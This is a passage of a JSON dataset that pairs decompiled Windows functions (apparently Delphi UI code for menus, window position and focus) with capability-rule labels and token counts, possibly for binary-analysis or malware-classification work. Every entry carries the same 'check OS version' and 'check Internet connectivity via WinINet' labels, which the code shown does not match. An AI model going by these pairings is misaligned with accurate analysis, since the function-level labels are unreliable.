            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f6d8(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x277)) {\n        if (((param_2 != '\\0') || (*(in_EAX + 0x277) != '\\x03')) && ((param_2 != '\\x03' || (*(in_EAX + 0x277) != '\\0')))\n           ) {\n            if ((param_2 == '\\x01') && (*(in_EAX + 0x9e) == '\\0')) {\n                puStack20 = 0x43f78d;\n                fcn.0043fbe0();\n            }\n            bVar3 = (*(in_EAX + 7) & 0x10) == 0;\n            if (bVar3) {\n                puStack20 = 0x43f7ac;\n                fcn.00459998();\n            }\n            uStack24 = 0x43f840;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            if (bVar3) {\n                puStack20 = &stack0xfffffffc;\n                (**(*in_EAX + 0xb0))();\n            }\n            cVar1 = *(in_EAX + 0x277);\n            *(in_EAX + 0x277) = param_2;\n            if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1d9) == '\\0')) {\n                fcn.0043fd18();\n                fcn.00450a08();\n            }\n            if (bVar3) {\n                fcn.004551b8();\n            }\n            if (param_2 == '\\x01') {\n                fcn.0043e40c();\n            }\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x43f847;\n            if (bVar3) {\n                uStack24 = 0x43f83f;\n                fcn.00459998();\n            }\n            return;\n        }\n        *(in_EAX + 0x277) = param_2;\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            puStack20 = 0x43f732;\n            cVar1 = fcn.00458904();\n            if (cVar1 != '\\0') {\n                puStack20 = 0x213;\n                uStack24 = 0;\n                uStack28 = 0;\n                uVar2 = fcn.004585f8(*((*(in_EAX + 0x277) == '\\x03') * 4 + 0x49256c), 0, 0);\n                sub.user32.dll_SetWindowPos(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 701
    },
    "0043f84c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f84c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x290) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x290) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 0x2a0) != 0) {\n            uVar4 = fcn.00434a54();\n        }\n        uVar1 = fcn.004585f8();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.004585f8();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0043f914": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043f914(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.00443e04(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.00443df0();\n            if ((param_2 == *(iVar2 + 0x290)) && (iVar2 = fcn.00443df0(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.00407550();\n                fcn.0040db38(arg_8h, arg_ch);\n                fcn.00404ec4();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x290) != 0) {\n        fcn.004382c8();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x290) = param_2;\n    if ((param_2 == 0) || ((fcn.00420098(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x271) == '\\x03')))) {\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.004585f8(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x290) + 0x5c) == '\\0') && (*(in_EAX + 0x277) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x290) + 0x34))();\n            arg_8h = fcn.004585f8();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x290) + 0x34))();\n                arg_8h = fcn.004585f8();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.004585f8();\n            fcn.004382c8();\n        }\n    }\n    else if ((*(in_EAX + 0x277) != '\\x01') && (cVar1 = fcn.00458904(),  cVar1 != '\\0')) {\n        uVar4 = fcn.004585f8(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x276) != '\\0') {\n        fcn.00440fd0();\n    }\n    fcn.0043f84c();\n    if (((*(in_EAX + 0x298) != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) && (*(in_EAX + 0x30) != 0)) {\n        uVar4 = fcn.004585f8(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar4);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1039
    },
    "0043fb50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043fb50(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x32c) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x32c) = uVar1;\n    }\n    return *(in_EAX + 0x32c);\n}\n",
        "token_count": 90
    },
    "0043fb78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043fb78(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x338) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x338) = uVar1;\n    }\n    return *(in_EAX + 0x338);\n}\n",
        "token_count": 87
    },
    "0043fcb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0043fcb0(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + 0x2a4) & 0xffffff00 | **(in_EAX + 0x2a4) != 0;\n}\n",
        "token_count": 62
    },
    "0043fdb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fdb4(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x273)) && (*(in_EAX + 0x273) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1da) != '\\0')) {\n        uVar1 = fcn.004585f8(*(param_2 * 4 + 0x492574));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0043fdf4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043fdf4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x279) != '\\0') && (*(*0x499c1c + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x279) == '\\x02') {\n            iVar10 = fcn.0043f5f4();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x279) == '\\x03') && (*(*0x499c20 + 0x68) != 0)) {\n            iVar10 = fcn.0043f5f4();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x279) == '\\x01') {\n            iVar10 = fcn.00444cd0();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.0043f5f4();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.00443dd4();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.00443dc0();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.00443dd4(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.00443dc0(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x9e) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00443dc0(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00443aa0();\n                                fcn.00443dc0(iVar4);\n                                iVar5 = fcn.00443a84();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00443dc0(iVar4 + iVar3);\n                                fcn.00443a6c();\n                                fcn.00443dc0();\n                                fcn.00443ab8();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else if (*(in_EAX + 0x9e) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00443dc0(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00443aa0();\n                                fcn.00443dc0(iVar4);\n                                iVar5 = fcn.00443a84();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00443dc0(iVar4 + iVar3);\n                                fcn.00443a6c();\n                                fcn.00443dc0();\n                                fcn.00443ab8();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else {\n                                fcn.00443dc0(iVar10, iVar1, iVar11);\n                                iVar3 = fcn.00443a6c();\n                                iVar4 = fcn.0043df9c();\n                                fcn.00443dc0();\n                                iVar5 = fcn.00443a6c();\n                                fcn.00443dc0();\n                                iVar7 = fcn.00443a6c();\n                                fcn.00443dc0();\n                                iVar8 = fcn.00443ab8();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar3 + iVar4) - iVar5)) {\n                                    fcn.00443dc0();\n                                    fcn.00443a6c();\n                                    fcn.00443dc0();\n                                    fcn.00443ab8();\n                                }\n                                fcn.00443dc0();\n                                iVar3 = fcn.00443aa0();\n                                iVar4 = fcn.0043dfbc();\n                                iVar3 = iVar3 + iVar4;\n                                fcn.00443dc0();\n                                iVar4 = fcn.00443aa0();\n                                fcn.00443dc0();\n                                iVar5 = fcn.00443aa0();\n                                fcn.00443dc0();\n                                iVar7 = fcn.00443a84();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.00443dc0();\n                                    uVar9 = fcn.00443aa0();\n                                    fcn.00443dc0(uVar9);\n                                    fcn.00443a84();\n                                }\n                                (**(*in_EAX + 0x88))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1312
    },
    "004407a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004407a8(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x4408d1;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x277) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x499c1c + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x499c1c + 0x44) + 0x29c) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.00407550();\n            fcn.0040dafc();\n            fcn.00404ec4();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x4977f8;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x499c1c + 0x44) + 0x29c);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x1b4) = uVar1;\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.00454b04();\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xef;\n    }\n    fcn.00443430();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.00405530(0x4408d8);\n    return;\n}\n",
        "token_count": 764
    },
    "00440924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00440924(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    code *pcStack32;\n    uint *puStack28;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        if ((*(in_EAX + 0x32c) != 0) && (var_14h = *(*(in_EAX + 0x32c) + 8),  -1 < var_14h + -1)) {\n            var_8h = 0;\n            var_4h = in_EAX;\n            if ((*(in_EAX + 0x55) & 0x20) != 0) {\n                puStack28 = 0x44097f;\n                fcn.00419898();\n                puStack28 = 0x440986;\n                fcn.00459998();\n            }\n            pcStack32 = 0x4409dc;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            puStack28 = &stack0xfffffffc;\n            piVar1 = fcn.00419898();\n            (**(*piVar1 + 0xb0))();\n            *in_FS_OFFSET = uStack36;\n            puStack28 = 0x4409e3;\n            if ((*(var_4h + 0x55) & 0x20) != 0) {\n                pcStack32 = 0x4409d4;\n                fcn.00419898();\n                pcStack32 = 0x4409db;\n                fcn.00459998();\n            }\n            return;\n        }\n        var_10h = *(in_EAX + 0x1b4);\n        var_ch._0_1_ = (*(in_EAX + 0x55) & 0x20) != 0;\n        puStack28 = &fcn.00440924::var_10h;\n        pcStack32 = fcn.004408e0;\n        uStack36 = 0x440a16;\n        uStack36 = sub.kernel32.dll_GetCurrentThreadId_1();\n        sub.user32.dll_EnumThreadWindows();\n    }\n    fcn.00454f7c();\n    return;\n}\n",
        "token_count": 556
    },
    "00440bfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00440bfc(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x49250c = *0x49250c + 1;\n    if (*(in_EAX + 0x298) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x268) = 0;\n        }\n        else {\n            *(in_EAX + 0x268) = param_2;\n        }\n    }\n    *(*0x499c20 + 100) = param_2;\n    *(*0x499c20 + 0x68) = in_EAX;\n    fcn.004199dc();\n    fcn.00419914();\n    cVar2 = fcn.004047dc();\n    if (cVar2 == '\\0') {\n        *(*0x499c20 + 0x6c) = 0;\n    }\n    else {\n        *(*0x499c20 + 0x6c) = in_EAX;\n        fcn.004199dc();\n        fcn.00419914();\n    }\n    if ((*(param_2 + 0x54) & 0x20) != 0) {\n        return 0;\n    }\n    *(param_2 + 0x54) = *(param_2 + 0x54) | *0x440e9c;\n    iVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != *(*0x499c20 + 0x78)) {\n        if (*(*0x499c20 + 0x78) != 0) {\n            fcn.004585f8();\n            *(*0x499c20 + 0x78) = 0;\n            cVar2 = fcn.0043babc();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        *(*0x499c20 + 0x78) = in_EAX;\n        fcn.004585f8();\n        cVar2 = fcn.0043babc();\n        if (cVar2 == '\\0') {\n            fcn.00404f70();\n            return 0;\n        }\n    }\n    if (*(in_EAX + 0x26c) == 0) {\n        *(in_EAX + 0x26c) = in_EAX;\n    }\n    if (*(in_EAX + 0x26c) != param_2) {\n        while ((*(in_EAX + 0x26c) != 0 && (cVar2 = fcn.00454450(),  cVar2 == '\\0'))) {\n            fcn.004585f8();\n            *(in_EAX + 0x26c) = *(*(in_EAX + 0x26c) + 0x30);\n            cVar2 = fcn.0043babc();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        while (iVar4 = param_2,  *(in_EAX + 0x26c) != param_2) {\n            do {\n                iVar3 = iVar4;\n                iVar4 = *(iVar3 + 0x30);\n            } while (iVar4 != *(in_EAX + 0x26c));\n            *(in_EAX + 0x26c) = iVar3;\n            fcn.004585f8();\n            cVar2 = fcn.0043babc();\n            if (cVar2 == '\\0') {\n                fcn.00404f70();\n                return 0;\n            }\n        }\n        piVar1 = *(param_2 + 0x30);\n        if ((*(param_2 + 0x1c) & 0x10) == 0) {\n            for (; piVar1 != NULL; piVar1 = piVar1[0xc]) {\n                cVar2 = fcn.004047dc();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xdc))();\n                }\n            }\n        }\n        fcn.00451b4c(param_2);\n        if ((*(in_EAX + 0x2c4) != 0) && (*(in_EAX + 0x2c4) != param_2)) {\n            iVar4 = 0;\n            fcn.00451b4c(0);\n        }\n    }\n    *in_FS_OFFSET = iVar4;\n    *(param_2 + 0x54) = ~*0x440e9c & *(param_2 + 0x54);\n    return param_2;\n}\n",
        "token_count": 1096
    },
    "00440ea4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00440ea4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((((*(in_EAX + 0x268) == 0) || (*(in_EAX + 0x298) != 0)) && (*(in_EAX + 0x30) != 0)) && (*(in_EAX + 0x298) == 0))\n    {\n        fcn.00458a28(0, 1);\n    }\n    uVar1 = fcn.004585f8();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.004585f8();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.00451b4c(0);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00440f1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440f1c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x276) = param_2;\n    if (*(in_EAX + 0x2c4) != 0) {\n        fcn.00451b4c(0);\n    }\n    if (param_2 != '\\0') {\n        if ((*(in_EAX + 0x268) == 0) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n            fcn.00458a28(0, 1);\n            fcn.00440ad0();\n        }\n        fcn.00440fd0();\n        fcn.00440ea4();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00440f80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440f80(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x276) != '\\0') && (*(in_EAX + 0x268) != 0)) {\n        fcn.00451b4c(param_2);\n    }\n    if (*(in_EAX + 0x277) == '\\x02') {\n        iVar1 = fcn.0043f4f4();\n        if (iVar1 != 0) {\n            fcn.0043f4f4();\n            fcn.00440f80();\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00440fd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440fd0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x358) & 8) == 0) && (*(*0x499c1c + 0x44) != 0)) && (*(*(*0x499c1c + 0x44) + 0x290) != 0)) &&\n       ((in_EAX != *(*0x499c1c + 0x44) && ((*(in_EAX + 0x277) == '\\x01' || (*(*(*0x499c1c + 0x44) + 0x277) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.00438910();\n        }\n        else {\n            fcn.004388f4();\n        }\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "00441160": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441160(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar *puStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    int32_t *var_4h;\n    \n    puStack44 = 0x44117c;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004253d0();\n    uStack48 = 0x44135b;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x44119b;\n    puStack44 = &stack0xfffffffc;\n    fcn.0042579c();\n    uStack60 = 0x441338;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = var_8h;\n    puStack72 = 0x4411b2;\n    puStack56 = &stack0xfffffffc;\n    var_ch = sub.gdi32.dll_SaveDC();\n    iStack76 = 0x4412eb;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar3 = fcn.00447e3c();\n    cVar1 = fcn.00448128();\n    if ((cVar1 != '\\0') || ((var_4h[0xa6] != 0 && (*(iVar3 + 8) != '\\0')))) {\n        (**(*var_4h + 0x44))();\n        if (*(iVar3 + 0x28) == '\\0') {\n            uVar2 = *(var_4h[0xa9] + 8) ^ 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n        if (uVar2 == 0) {\n            *(var_4h[0xa9] + 8) = 0;\n        }\n        else {\n            iStack76 = var_10h - *(iVar3 + 0x18);\n            puStack80 = var_14h - *(iVar3 + 0x14);\n            puStack72 = var_8h;\n            sub.gdi32.dll_ExcludeClipRect();\n        }\n        if (var_4h[0xa6] == 0) {\n            iStack76 = 4;\n            puStack80 = 0x44125b;\n            puStack80 = sub.gdi32.dll_GetStockObject();\n            puStack80 = fcn.00425714(&fcn.00441160::var_1ch);\n            sub.user32.dll_FillRect();\n        }\n        else {\n            iStack76 = 0x44128c;\n            fcn.00424fb8();\n            iStack76 = 0x44129f;\n            fcn.004250d4();\n            iStack76 = 0x4412aa;\n            iStack76 = fcn.00424230();\n            puStack80 = 0x4412b9;\n            puStack80 = fcn.00425714();\n            sub.gdi32.dll_SetBkColor();\n            fcn.0042535c();\n        }\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x4412f2;\n    iStack76 = var_ch;\n    puStack80 = var_8h;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 900
    },
    "0044168c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044168c(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        (**(*in_EAX + -0x10))();\n        return;\n    }\n    fcn.0045786c();\n    return;\n}\n",
        "token_count": 88
    },
    "004416a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
